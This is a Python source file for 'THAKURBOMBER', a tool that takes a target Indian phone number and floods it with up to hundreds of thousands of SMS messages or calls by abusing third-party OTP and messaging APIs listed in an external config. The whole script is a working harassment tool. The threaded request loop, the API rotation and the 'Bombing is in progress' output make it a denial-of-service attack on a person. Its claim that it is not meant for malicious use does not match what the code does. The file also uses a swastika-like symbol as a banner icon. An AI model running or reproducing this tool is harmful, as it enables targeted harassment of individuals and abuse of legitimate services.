#!/usr/bin/python

import os, subprocess, sys, shutil
import string, re, random, json
import time, threading
import argparse

from termcolor import colored
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed



try:
    import requests
    from colorama import Fore, Style
except ImportError:
    print("\tSome dependencies could not be imported (import error) ")
    print("Type `pip3 install -r requirements.txt` to install all required packages")
    sys.exit(1)


def prRed(prt): print("\033[93m {}\033[00m" .format(prt))
def prGreen(prt): print("\033[92m {}\033[00m" .format(prt))
def prYellow(prt): print("\033[93m {}\033[00m" .format(prt))
def prLightPurple(prt): print("\033[94m {}\033[00m" .format(prt))
def prPurple(prt): print("\033[95m {}\033[00m" .format(prt))
def prCyan(prt): print("\033[96m {}\033[00m" .format(prt))
def prLightGray(prt): print("\033[97m {}\033[00m" .format(prt))
def prBlack(prt): print("\033[98m {}\033[00m" .format(prt))

class Icons(object):
    def __init__(self):
        self.PASS = Style.BRIGHT + Fore.GREEN + "[ ✔ ]" + Style.RESET_ALL
        self.FAIL = Style.BRIGHT + Fore.RED + "[ ✘ ]" + Style.RESET_ALL
        self.MADE = Style.BRIGHT + Fore.CYAN + "[ 卐 ]" + Style.RESET_ALL
        self.WARN = Style.BRIGHT + Fore.YELLOW + "[ ! ]" + Style.RESET_ALL
        self.HEAD = Style.BRIGHT + Fore.CYAN + "[ # ]" + Style.RESET_ALL
        self.CMDL = Style.BRIGHT + Fore.BLUE + "[ ➡ ]" + Style.RESET_ALL
        self.TRGM = Style.BRIGHT + Fore.BLUE + "[ ➡ ]" + Style.RESET_ALL
        self.STDS = "     "

class StatusDecorator(object):
    def __init__(self):
        self.PASS = Style.BRIGHT + Fore.GREEN + "[ SUCCESS ]" + Style.RESET_ALL
        self.FAIL = Style.BRIGHT + Fore.RED + "[ FAIL ]" + Style.RESET_ALL
        self.WARN = Style.BRIGHT + Fore.YELLOW + "[ WARNING ]" + Style.RESET_ALL
        self.HEAD = Style.BRIGHT + Fore.CYAN + "[ SECTION ]" + Style.RESET_ALL
        self.MADE = Style.BRIGHT + Fore.CYAN + "[ MADEBY ]" + Style.RESET_ALL
        self.CMDL = Style.BRIGHT + Fore.BLUE + "[ COMMAND ]" + Style.RESET_ALL
        self.TRGM = Style.BRIGHT + Fore.BLUE + "[ TARGET ]" + Style.RESET_ALL
        self.STDS = "           "

class MessageDecorator(object):
    def __init__(self, attr):
        ICON = Icons()
        STAT = StatusDecorator()
        if attr == "icon":
            self.PASS = ICON.PASS
            self.FAIL = ICON.FAIL
            self.WARN = ICON.WARN
            self.HEAD = ICON.HEAD
            self.CMDL = ICON.CMDL
            self.MADE = ICON.MADE
            self.STDS = ICON.STDS
            self.TRGM = ICON.TRGM
        elif attr == "stat":
            self.PASS = STAT.PASS
            self.FAIL = STAT.FAIL
            self.WARN = STAT.WARN
            self.HEAD = STAT.HEAD
            self.MADE = STAT.MADE
            self.CMDL = STAT.CMDL
            self.STDS = STAT.STDS
            self.TRGM = STAT.TRGM

    def SuccessMessage(self, RequestMessage):
        print(self.PASS + " " + Style.RESET_ALL + RequestMessage)

    def FailureMessage(self, RequestMessage):
        print(self.FAIL + " " + Style.RESET_ALL + RequestMessage)

    def WarningMessage(self, RequestMessage):
        print(self.WARN + " " + Style.RESET_ALL + RequestMessage)

    def SectionMessage(self, RequestMessage):
        print(self.HEAD + " " + Fore.CYAN + Style.BRIGHT + RequestMessage + Style.RESET_ALL)

    def MadeBy(self, RequestMessage):
        print(self.MADE + " " + Fore.CYAN + Style.BRIGHT + RequestMessage + Style.RESET_ALL)
        
    def CommandMessage(self, RequestMessage):
        return self.CMDL + " " + Style.RESET_ALL + RequestMessage
        
    def TargetMessage(self, RequestMessage):
        return self.TRGM + " " + Style.RESET_ALL + RequestMessage

    def GeneralMessage(self, RequestMessage):
        print(self.STDS + " " + Style.RESET_ALL + RequestMessage)


class APIProvider:

    api_providers=[]
    delay = 0
    status = True

    def __init__(self,cc,target,mode,delay=0):
        with open('api.json', 'r') as file:
            PROVIDERS = json.load(file)
        self.config = None
        self.cc = cc
        self.target = target
        self.mode = mode
        self.index = 0
        self.lock = threading.Lock()
        APIProvider.delay = delay
        providers=PROVIDERS.get(mode.lower(),{})
        APIProvider.api_providers = providers.get(cc,[])
        if len(APIProvider.api_providers)<10:
            APIProvider.api_providers+=providers.get("multi",[])

    def format(self):
        config_dump = json.dumps(self.config)
        config_dump = config_dump.replace("{target}",self.target).replace("{cc}",self.cc)
        self.config = json.loads(config_dump)

    def select_api(self):
        try:
            self.index = random.choice(range(len(APIProvider.api_providers)))
        except IndexError:
            self.index=-1
            return
        self.config = APIProvider.api_providers[self.index]
        perma_headers = {"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"}
        if "headers" in self.config:
            self.config["headers"].update(perma_headers)
        else:
            self.config["headers"]=perma_headers
        self.format()

    def remove(self):
        try:
            del APIProvider.api_providers[self.index]
            return True
        except:
            return False

    def request(self):
        self.select_api()
        if not self.config or self.index==-1:
            return None
        identifier=self.config.pop("identifier","").lower()
        del self.config['name']
        self.config['timeout']=30
        response=requests.request(**self.config)
        return identifier in response.text.lower()

    def hit(self):
        try:
            if not APIProvider.status:
                return
            time.sleep(APIProvider.delay)
            self.lock.acquire()
            response = self.request()
            if response==False:
                self.remove()
            elif response==None:
                APIProvider.status=False
            return response
        except:
            response=False
        finally:
            self.lock.release()
            return response



def readisdc():
    with open("countrycodes.json") as file:
        countrycodes = json.load(file)
    return countrycodes

def get_version():
    try:
        return open(".version","r").read().strip()
    except:
        return '5.0'

def clr():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def bann_text():
    clr()
    logo="""
████████╗██╗  ██╗ █████╗ ██╗  ██╗██╗   ██╗██████╗   
╚══██╔══╝██║  ██║██╔══██╗██║ ██╔╝██║   ██║██╔══██╗  
   ██║   ███████║███████║█████╔╝ ██║   ██║██████╔╝  
   ██║   ██╔══██║██╔══██║██╔═██╗ ██║   ██║██╔══██╗  
   ██║   ██║  ██║██║  ██║██║  ██╗╚██████╔╝██║  ██║  
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝         
     """
    version="Version: "+__VERSION__
    contributors="MADE BY: "+" ".join(__CONTRIBUTOR__)
    print(random.choice(ALL_COLORS) + logo + RESET_ALL)
    
    mesgdcrt.MadeBy(contributors)
    print()


def check_intr():
    try:
        requests.get("https://motherfuckingwebsite.com")
    except Exception:
        bann_text()
        mesgdcrt.FailureMessage("Poor internet connection detected")
        sys.exit(2)

def format_phone(num):
    num=[n for n in num if n in string.digits]
    return ''.join(num).strip()

def do_zip_update():
    success=False

    # Download Zip from git
    # Unzip and overwrite the current folder

    if success:
        mesgdcrt.SuccessMessage("THAKURBOMBER was updated to the latest version")
        mesgdcrt.GeneralMessage("Please run the script again to load the latest version")
    else:
        mesgdcrt.FailureMessage("Unable to update THAKURBOMBER.")
        mesgdcrt.WarningMessage("Grab The Latest one From https://github.com/Hackersthakur/STHAKURBOMBER.git")

    sys.exit()

def do_git_update():
    success=False
    try:
        print(ALL_COLORS[0]+"UPDATING "+RESET_ALL,end='')
        process = subprocess.Popen("git checkout . && git pull ", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        while process:
            print(ALL_COLORS[0]+'.'+RESET_ALL,end='')
            time.sleep(1)
            returncode = process.poll()
            if returncode is not None:
                break
        success = not process.returncode
    except:
        success = False
    print("\n")

    if success:
        mesgdcrt.SuccessMessage("THAKURBOMBER was updated to the latest version")
        mesgdcrt.GeneralMessage("Please run the script again to load the latest version")
    else:
        mesgdcrt.FailureMessage("Unable to update THAKURBOMBER.")
        mesgdcrt.WarningMessage("Make Sure To Install 'git' ")
        mesgdcrt.GeneralMessage("Then run command:")
        print("git checkout . && git pull https://github.com/Hackersthakur/STHAKURBOMBER HEAD")
    sys.exit()

def update():
    if shutil.which('git'):
        do_git_update()
    else:
        do_zip_update()
def check_for_updates():
    mesgdcrt.SectionMessage("Checking for updates")
    fver = requests.get("https://raw.githubusercontent.com/Hackersthakur/STHAKURBOMBER/main/.version").text.strip()
    if fver != __VERSION__:
        mesgdcrt.WarningMessage("An update is available")
        mesgdcrt.GeneralMessage("Starting update...")
        update()
    else:
        mesgdcrt.SuccessMessage("THAKURBOMBER is up-to-date")
        mesgdcrt.GeneralMessage("Starting THAKURBOMBER\n")
        
        mesgdcrt.WarningMessage("ONLY INDIAN NUMBERS ALLOWED")


def get_phone_info():
    while True:
        target = ""
        cc = "91"
        cc = format_phone(cc)
        if not country_codes.get(cc,False):
            mesgdcrt.WarningMessage("The country code ({cc}) that you have entered is invalid or unsupported".format(cc=cc))
            continue
        target = input(mesgdcrt.TargetMessage("Enter the target number: +" + cc + " "))
        target = format_phone(target)
        if ((len(target) <= 6) or (len(target) >= 12)):
            mesgdcrt.WarningMessage("The phone number ({target}) that you have entered is invalid".format(target=target))
            continue
        return (cc,target)



def pretty_print(cc,target,success,failed):
    requested = success+failed
    contacts="hackersthakurindia@gmail.com"
    logo="""
████████╗██╗  ██╗ █████╗ ██╗  ██╗██╗   ██╗██████╗   
╚══██╔══╝██║  ██║██╔══██╗██║ ██╔╝██║   ██║██╔══██╗  
   ██║   ███████║███████║█████╔╝ ██║   ██║██████╔╝  
   ██║   ██╔══██║██╔══██║██╔═██╗ ██║   ██║██╔══██╗  
   ██║   ██║  ██║██║  ██║██║  ██╗╚██████╔╝██║  ██║  
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝         
     """
    print(random.choice(ALL_COLORS) + logo)
    mesgdcrt.SectionMessage("Bombing is in progress")
    
    mesgdcrt.GeneralMessage("Target       : " + cc +" "+ target)
    mesgdcrt.GeneralMessage("Sent         : " + str(requested))
    mesgdcrt.GeneralMessage("Successful   : " + str(success))
    mesgdcrt.GeneralMessage("Failed       : " + str(failed))
    
    mesgdcrt.SuccessMessage("THAKURBOMBER was created by HACKER STHAKUR")
    mesgdcrt.GeneralMessage("Contact : "+ random.choice(ALL_COLORS) + contacts)

def workernode(mode,cc,target,count,delay,max_threads):

    api = APIProvider(cc,target,mode,delay=delay)
    
    clr()
    mesgdcrt.SectionMessage("Gearing up the Bomber")
    
    mesgdcrt.GeneralMessage("Target        : " + cc + target)
    mesgdcrt.GeneralMessage("Amount        : " + str(count) )
    mesgdcrt.GeneralMessage("Threads       : " + str(max_threads) + " threads")
    mesgdcrt.GeneralMessage("Delay         : " + str(delay) + " seconds")
    
    print()
    input(mesgdcrt.CommandMessage("Press [CTRL+Z] to suspend the bomber or [ENTER] to resume it"))

    if len(APIProvider.api_providers)==0:
        mesgdcrt.FailureMessage("Your country/target is not supported as of now")
        mesgdcrt.GeneralMessage("Feel free to reach out to us")
        
        bann_text()
        sys.exit()

    success,failed=0,0
    while success<count:
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            jobs = []
            for i in range(count-success):
                jobs.append(executor.submit(api.hit))

            for job in as_completed(jobs):
                result = job.result()
                if result==None:
                    mesgdcrt.FailureMessage("Bombing limit for your target has been reached")
                    mesgdcrt.GeneralMessage("Try Again Later !!")
                                     
                    bann_text()
                    sys.exit()
                if result:
                    success+=1
                else:
                    failed+=1
                clr()
                pretty_print(cc,target,success,failed)
    print("\n")
    mesgdcrt.SuccessMessage("Bombing completed!")
    time.sleep(1.5)
    bann_text()
    sys.exit()

def selectnode(mode="sms"):
    mode=mode.lower().strip()
    try:
        clr()
        bann_text()
        check_intr()
        check_for_updates()
        

        max_limit={"sms":500000,"call":1500}
        cc,target="",""
        if mode in ["sms","call"]:
            cc,target=get_phone_info()
            if cc!="91":
                max_limit.update({"sms":100})
      
        else:
            raise KeyboardInterrupt


        limit=max_limit[mode]
        while True:
            try:
                message=("Enter number of {type} to send (Max {limit}): ").format(type=mode.upper(),limit=limit)
                count = 50000
                if count > limit or count==0:
                    mesgdcrt.WarningMessage("You have requested " + str(count) + " {type}".format(type=mode.upper()))
                    mesgdcrt.GeneralMessage("Automatically capping the value to {limit}".format(limit=limit))
                    count = limit
                delay = 1
                # delay = 0
                max_threads = 10
                if (count < 0 or delay < 0):
                    raise Exception
                break
            except KeyboardInterrupt as ki:
                raise ki
            except:
                mesgdcrt.FailureMessage("Read Instructions Carefully !!!")
                print()

        workernode(mode,cc,target,count,delay,max_threads)
    except KeyboardInterrupt:
        mesgdcrt.WarningMessage("Received INTR call - Exiting...")
        sys.exit()

if sys.version_info[0]!=3:
    mesgdcrt.FailureMessage("THAKURBOMBER will work only in Python v3")
    sys.exit()

try:
    country_codes = readisdc()["countrycodes"]
except FileNotFoundError:
    update()

mesgdcrt = MessageDecorator("icon")


__VERSION__ = get_version()
__CONTRIBUTOR__ = ['HACKERSTHAKUR']

ALL_COLORS = [Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
RESET_ALL = Style.RESET_ALL

description="""THAKURBOMBER - Your Friendly Spammer Application

THAKURBOMBERcan be used for many purposes which incudes - 
\t Exposing the vulnerable APIs over Internet
\t Friendly Spamming
\t Testing Your Spam Detector and more ....

THAKURBOMBER is not intented for malicious uses.
"""

parser = argparse.ArgumentParser(description=description,epilog='Coded by HACKER S THAKUR !!!')
parser.add_argument("-sms","--sms", action="store_true",help="start THAKURBOMBER with SMS Bomb mode")
parser.add_argument("-call","--call", action="store_true",help="start THAKURBOMBER with CALL Bomb mode")

parser.add_argument("-u","--update", action="store_true",help="update THAKURBOMBER")
parser.add_argument("-c","--contributors", action="store_true",help="show current THAKURBOMBER contributors")
parser.add_argument("-v","--version", action="store_true",help="show current THAKURBOMBER version")


if __name__ == "__main__":
    args = parser.parse_args()
    if args.version:
        print("Version: ",__VERSION__)
    elif args.contributors:
        print("Contributors: "," ".join(__CONTRIBUTOR__))
    elif args.update:
        update()

    elif args.call:
        selectnode(mode="call")
    elif args.sms:
        selectnode(mode="sms")
    else:
        choice=""
        avail_choice={"1":"SMS","2":"CALL"}
        try:
            while (not choice in avail_choice):
                clr()
                bann_text()
                prRed("Choose One Option:\n")
                for key,value in avail_choice.items():
                    prPurple("[ {key} ] {value} BOMBER".format(key=key,value=value))
                print()
                choice=input(mesgdcrt.CommandMessage("Select Bombing Choice : "))
            selectnode(mode=avail_choice[choice].lower())
        except KeyboardInterrupt:        
            mesgdcrt.WarningMessage("Received INTR call - Exiting...")
            sys.exit()
    sys.exit()
